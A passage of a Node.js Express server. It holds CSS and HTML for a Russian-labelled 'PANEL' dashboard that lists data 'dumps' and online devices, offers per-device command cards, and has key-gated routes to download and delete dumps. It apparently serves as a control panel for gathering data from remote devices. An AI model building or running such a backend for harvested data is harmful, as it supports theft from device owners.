  display:flex;align-items:flex-end;justify-content:space-between;gap:20px;
  padding:26px 32px 22px;border-bottom:1px solid var(--line);
  position:sticky;top:0;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);z-index:5;
}
.page-title{font-size:22px;font-weight:700;letter-spacing:-.02em;color:var(--strong)}
.page-sub{margin-top:3px;font-size:12px;color:var(--fg-3);letter-spacing:.03em}
.stats{display:flex;gap:22px;flex-wrap:wrap;align-items:flex-end}
.stat{text-align:right}
.stat-val{font-size:17px;font-weight:600;color:var(--strong);font-variant-numeric:tabular-nums;letter-spacing:-.01em}
.stat-key{font-size:10px;color:var(--fg-3);letter-spacing:.14em;text-transform:uppercase}
.content{padding:26px 32px 64px;flex:1}

/* toolbar */
.toolbar{display:flex;align-items:center;gap:10px;margin-bottom:14px}
.spacer{flex:1}
.search{
  width:280px;padding:8px 12px;border-radius:7px;border:1px solid var(--line);
  background:var(--panel);color:var(--fg);font-size:12.5px;font-family:inherit;transition:border-color .15s,box-shadow .15s;
}
.search::placeholder{color:var(--fg-3)}
.search:focus{outline:none;border-color:var(--line-2);box-shadow:0 0 0 3px var(--hover)}

/* buttons */
.btn{
  display:inline-flex;align-items:center;justify-content:center;gap:6px;
  padding:7px 13px;border:1px solid var(--line-2);border-radius:6px;
  font-size:12px;font-weight:600;color:var(--fg);background:transparent;
  transition:background .14s,color .14s,border-color .14s;white-space:nowrap;cursor:pointer;
  font-family:inherit;
}
.btn:hover{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
.btn.primary{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
.btn.primary:hover{filter:brightness(1.08)}
.btn.mini{padding:3px 9px;font-size:11px}

/* table */
.table-wrap{border:1px solid var(--line);border-radius:9px;overflow:auto;background:var(--panel);max-height:calc(100vh - 270px)}
table{width:100%;border-collapse:separate;border-spacing:0}
thead th{
  text-align:left;padding:11px 16px;font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
  color:var(--fg-3);font-weight:600;background:var(--thead);border-bottom:1px solid var(--line);
  position:sticky;top:0;z-index:2;white-space:nowrap;
}
tbody td{padding:13px 16px;border-bottom:1px solid var(--row-line);vertical-align:middle}
tbody tr:last-child td{border-bottom:none}
tbody tr{transition:background .1s}
tbody tr:hover{background:var(--hover)}
.striped tbody tr:nth-child(even){background:var(--zebra)}
.striped tbody tr:nth-child(even):hover{background:var(--hover)}
td.right,th.right{text-align:right}
td.right .btn+.btn{margin-left:6px}
.note{max-width:520px}
.sub{margin-top:5px;font-size:12px;color:var(--fg-2)}
.thumb{margin-top:8px}
.thumb img{max-width:280px;border-radius:6px;border:1px solid var(--line-2);cursor:zoom-in;display:block;transition:border-color .15s}
.thumb img:hover{border-color:var(--accent)}

/* pills & tags */
.pill{display:inline-block;padding:2px 8px;border-radius:99px;font-size:10.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--line-2);color:var(--fg-2);vertical-align:middle}
.pill.on{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
.pill.off{color:var(--fg-2);border-color:var(--line-2);background:var(--hover)}
.tag{display:inline-block;padding:2px 7px;border:1px solid var(--line);border-radius:4px;font-size:11px;color:var(--fg-2);margin:0 4px 0 0;font-family:ui-monospace,Menlo,Consolas,monospace;vertical-align:middle}
.bar{height:4px;border-radius:99px;background:var(--line);margin-top:8px;overflow:hidden;max-width:240px}
.bar i{display:block;height:100%;background:var(--accent);border-radius:99px;transition:width .3s}

/* pager */
.pager{display:flex;align-items:center;gap:4px;margin-top:14px;flex-wrap:wrap}
.pg{min-width:30px;height:30px;display:inline-grid;place-items:center;padding:0 8px;border:1px solid var(--line);border-radius:6px;font-size:12px;color:var(--fg-2);transition:all .14s}
.pg:hover{border-color:var(--line-2);color:var(--fg)}
.pg.active{background:var(--accent);color:var(--accent-fg);border-color:var(--accent);font-weight:600}
.pg.dots{border:none;color:var(--fg-3)}
.pg-info{margin-left:auto;color:var(--fg-3);font-size:11.5px}

/* empty */
.empty{padding:80px 20px;text-align:center;color:var(--fg-3);font-size:13px}
.empty.small{padding:32px 20px}
.empty-mark{font-size:34px;color:var(--line-2);margin-bottom:12px}

/* devices */
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
.card{display:block;padding:16px 18px;border:1px solid var(--line);border-radius:9px;background:var(--panel);transition:border-color .16s,background .16s,transform .16s}
.card:hover{border-color:var(--line-2);background:var(--hover);transform:translateY(-1px)}
.card-top{display:flex;align-items:center;gap:9px;padding-bottom:12px;margin-bottom:12px;border-bottom:1px solid var(--line)}
.card-title{font-weight:600;font-size:13.5px;color:var(--strong);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.card-ago{font-size:11px;color:var(--fg-3)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--line-2);flex-shrink:0}
.dot.on{background:var(--accent);box-shadow:0 0 8px var(--accent)}
.kv{display:flex;justify-content:space-between;gap:12px;font-size:12.5px;padding:3px 0}
.kv span{color:var(--fg-3);flex-shrink:0}
.kv b{font-weight:500;color:var(--fg);text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* device detail */
.back{font-size:12.5px;color:var(--fg-2);font-weight:600}
.back:hover{color:var(--accent)}
.dev-head{display:flex;align-items:center;justify-content:space-between;gap:16px;margin:16px 0 22px;flex-wrap:wrap}
.dev-name{font-size:20px;font-weight:700;color:var(--strong);letter-spacing:-.01em}
.dev-sub{margin-top:4px;color:var(--fg-3)}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-bottom:28px}
.cmd{border:1px solid var(--line);border-radius:9px;padding:16px;background:var(--panel);font-weight:600;font-size:13.5px;color:var(--fg);transition:all .16s;display:flex;flex-direction:column;gap:8px}
.cmd span{font-size:10.5px;color:var(--fg-3);letter-spacing:.12em;font-family:ui-monospace,Menlo,Consolas,monospace}
.cmd:hover{border-color:var(--accent);background:var(--hover);color:var(--strong);transform:translateY(-2px)}
.section-title{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);font-weight:600;margin:0 0 12px}
.section-title .faint{margin-left:6px;letter-spacing:0}

/* settings */
.settings{max-width:820px}
.theme-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin-bottom:26px}
.theme-card{
  display:flex;align-items:center;gap:10px;padding:12px 14px;border:1px solid var(--line);
  border-radius:9px;background:var(--panel);cursor:pointer;transition:all .15s;
}
.theme-card:hover{border-color:var(--line-2)}
.theme-card.active{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset}
.theme-card input{display:none}
.swatches{display:flex;gap:3px;flex-shrink:0}
.swatches i{width:11px;height:11px;border-radius:50%;display:block;border:1px solid rgba(0,0,0,.2)}
.theme-name{font-size:12.5px;font-weight:600;color:var(--fg)}
.set-card{border:1px solid var(--line);border-radius:9px;background:var(--panel);margin-bottom:26px;overflow:hidden}
.set-row{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:13px 16px;border-bottom:1px solid var(--row-line);flex-wrap:wrap}
.set-row:last-child{border-bottom:none}
.row-text{display:flex;flex-direction:column;gap:2px;min-width:180px}
.row-text b{font-size:13px;font-weight:600;color:var(--fg)}
.row-text small{font-size:11.5px;color:var(--fg-3)}
.row-toggle{display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--row-line);cursor:pointer}
.row-toggle:last-child{border-bottom:none}
.row-toggle .row-text{flex:1}
.row-toggle input{display:none}
.switch{width:38px;height:22px;border-radius:99px;border:1px solid var(--line-2);background:var(--hover);position:relative;flex-shrink:0;transition:background .16s,border-color .16s}
.switch::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:var(--fg-2);transition:transform .16s,background .16s}
.row-toggle input:checked+.switch{background:var(--accent);border-color:var(--accent)}
.row-toggle input:checked+.switch::after{transform:translateX(16px);background:var(--accent-fg)}
.seg{display:inline-flex;border:1px solid var(--line);border-radius:7px;overflow:hidden;background:var(--bg-2)}
.seg-item{padding:6px 12px;font-size:11.5px;font-weight:600;color:var(--fg-2);cursor:pointer;transition:all .13s;border-right:1px solid var(--line)}
.seg-item:last-child{border-right:none}
.seg-item:hover{color:var(--fg)}
.seg-item input{display:none}
.seg-item.active{background:var(--accent);color:var(--accent-fg)}
.set-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.set-actions .faint{margin-left:auto;font-size:11px}
.toast{border:1px solid var(--accent);color:var(--accent);background:var(--hover);border-radius:8px;padding:10px 14px;font-size:12.5px;font-weight:600;margin-bottom:20px;max-width:820px}

/* density */
.dense tbody td{padding:8px 14px}
.dense thead th{padding:8px 14px}
.dense .card{padding:12px 14px}
.dense .nav{padding:7px 12px}

/* themes */
body{
  --fs:14px;
  --wash:rgba(255,255,255,.05);
  --hover:rgba(255,255,255,.045);
  --zebra:rgba(255,255,255,.018);
}
body.t-mono{
  --bg:#0b0b0b;--bg-2:#0e0e0e;--panel:#131313;--thead:#0d0d0d;
  --line:#232323;--line-2:#343434;--row-line:#1a1a1a;
  --fg:#ededed;--fg-2:#9a9a9a;--fg-3:#6a6a6a;--strong:#fff;
  --accent:#ffffff;--accent-fg:#0b0b0b;
}
body.t-graphite{
  --bg:#141414;--bg-2:#181818;--panel:#1d1d1d;--thead:#161616;
  --line:#2b2b2b;--line-2:#3d3d3d;--row-line:#232323;
  --fg:#dcdcdc;--fg-2:#9d9d9d;--fg-3:#757575;--strong:#f5f5f5;
  --accent:#d9d9d9;--accent-fg:#141414;
  --wash:rgba(255,255,255,.045);
}
body.t-paper{
  --bg:#f7f7f5;--bg-2:#f1f1ee;--panel:#ffffff;--thead:#fafaf8;
  --line:#e4e4df;--line-2:#cfcfc8;--row-line:#efefea;
  --fg:#1a1a18;--fg-2:#5c5c57;--fg-3:#8b8b84;--strong:#000;
  --accent:#111111;--accent-fg:#ffffff;
  --wash:rgba(0,0,0,.035);--hover:rgba(0,0,0,.035);--zebra:rgba(0,0,0,.016);
}
body.t-terminal{
  --bg:#050906;--bg-2:#080e0a;--panel:#0c1410;--thead:#070d09;
  --line:#17281d;--line-2:#24422f;--row-line:#122018;
  --fg:#d7f5e2;--fg-2:#7fae90;--fg-3:#557a63;--strong:#eafff2;
  --accent:#4ade80;--accent-fg:#04150a;
  --wash:rgba(74,222,128,.07);--hover:rgba(74,222,128,.06);--zebra:rgba(74,222,128,.025);
}
body.t-amber{
  --bg:#0b0906;--bg-2:#100d08;--panel:#15110a;--thead:#0d0a06;
  --line:#2a2317;--line-2:#463a24;--row-line:#221c12;
  --fg:#f5ead6;--fg-2:#b6a382;--fg-3:#84765c;--strong:#fff6e4;
  --accent:#f0b429;--accent-fg:#160f02;
  --wash:rgba(240,180,41,.07);--hover:rgba(240,180,41,.055);--zebra:rgba(240,180,41,.022);
}
body.t-crimson{
  --bg:#0c0708;--bg-2:#110a0b;--panel:#170d0f;--thead:#0e0809;
  --line:#2c1a1e;--line-2:#47282e;--row-line:#231316;
  --fg:#f7e9ea;--fg-2:#bd9b9f;--fg-3:#8a6c70;--strong:#fff2f3;
  --accent:#e8556b;--accent-fg:#1a0508;
  --wash:rgba(232,85,107,.08);--hover:rgba(232,85,107,.06);--zebra:rgba(232,85,107,.024);
}

/* mobile */
@media(max-width:860px){
  .shell{flex-direction:column}
  .sidebar{width:auto;height:auto;position:static;flex-direction:row;align-items:center;border-right:none;border-bottom:1px solid var(--line);overflow-x:auto}
  .brand{border-bottom:none;padding:14px 16px;flex-shrink:0}
  .brand-tag{display:none}
  .nav-wrap{flex-direction:row;padding:8px;gap:4px;flex:1}
  .nav{white-space:nowrap;padding:8px 12px}
  .nav-count{display:none}
  .side-foot{display:none}
  .topbar{padding:18px 18px 16px;position:static}
  .content{padding:18px 18px 48px}
  .table-wrap{max-height:none}
  table{min-width:640px}
  .stats{gap:16px}
  .search{width:100%}
  .toolbar{flex-wrap:wrap}
}
</style></head>
<body class="${bodyClass}" style="--fs:${S.fontSize}px"${S.autoRefresh ? ` data-autoref="${S.autoRefresh}"` : ''}>
<div class="shell">
  <aside class="sidebar">
    <div class="brand">
      <div class="mark">◆</div>
      <div class="brand-name">PANEL</div>
      <div class="brand-tag mono">v2</div>
    </div>
    <div class="nav-wrap">${navHtml}</div>
    <div class="side-foot">
      <div class="foot-line"><b>${deviceList.length}</b> устройств · <b>${onlineCount}</b> online</div>
      <div class="tdots">${themesDots}</div>
    </div>
  </aside>

  <main class="main">
    <div class="topbar">
      <div>
        <div class="page-title">${titles[tab] || 'Panel'}</div>
        <div class="page-sub">${files.length} дампов · ${fmtSize(totalSize)} · ${deviceList.length} устройств</div>
      </div>
      <div class="stats">
        <div class="stat"><div class="stat-val">${files.length}</div><div class="stat-key">Dumps</div></div>
        <div class="stat"><div class="stat-val">${fmtSize(totalSize)}</div><div class="stat-key">Storage</div></div>
        <div class="stat"><div class="stat-val">${onlineCount}/${deviceList.length}</div><div class="stat-key">Online</div></div>
      </div>
    </div>
    <div class="content">${body}</div>
  </main>
</div>
<script>
(function(){
  var s=document.querySelector('[data-search]');
  if(s){s.addEventListener('input',function(){
    var q=s.value.toLowerCase();
    var rows=document.querySelectorAll('tbody tr');
    for(var i=0;i<rows.length;i++){
      rows[i].style.display=rows[i].textContent.toLowerCase().indexOf(q)>-1?'':'none';
    }
  });}
  var a=document.body.getAttribute('data-autoref');
  if(a){var t=parseInt(a,10);if(t>0){setInterval(function(){if(document.hasFocus())location.reload();},t*1000);}}
})();
</script>
</body></html>`;

  res.setHeader('Cache-Control', 'no-store');
  res.type('html').send(html);
});

app.get('/delete/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  const metaP = p + '.json';
  if (fs.existsSync(metaP)) fs.unlinkSync(metaP);
  bust('dumps', 'stats');
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY));
});

app.get('/clear', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  for (const f of fs.readdirSync(SAVE_DIR)) {
    try { fs.unlinkSync(path.join(SAVE_DIR, f)); } catch (e) {}
  }
  bust('dumps', 'stats');
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY));
});

app.get('/clearlogs', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  writeLogs([]);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=logs');
});

app.get('/clearuploadlogs', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  writeUploadLogs([]);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=uploadlog');
});

app.get('/download/:name', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
  const p = path.join(SAVE_DIR, req.params.name);
  if (!fs.existsSync(p)) return res.status(404).send('not found');
  res.download(p);
});

app.use('/media', express.static(MEDIA_DIR, { maxAge: '7d', immutable: true }));

app.get('/health', (req, res) => {
  res.setHeader('Cache-Control', 'no-store');
  res.type('text/plain').send('ok');
});

app.listen(PORT, () => console.log('server on ' + PORT));
